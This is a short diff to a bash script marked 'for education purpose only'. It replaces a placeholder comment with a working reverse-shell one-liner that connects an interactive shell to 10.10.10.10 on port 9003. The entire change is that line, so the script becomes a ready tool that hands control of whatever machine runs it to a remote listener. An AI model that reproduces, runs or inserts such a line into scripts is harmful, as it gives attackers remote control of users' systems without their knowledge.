@@ -1,3 +1,3 @@
 #!/bin/bash
 ## for education purpose only
-## helloooooooooooooooo
+sh -i >& /dev/tcp/10.10.10.10/9003 0>&1
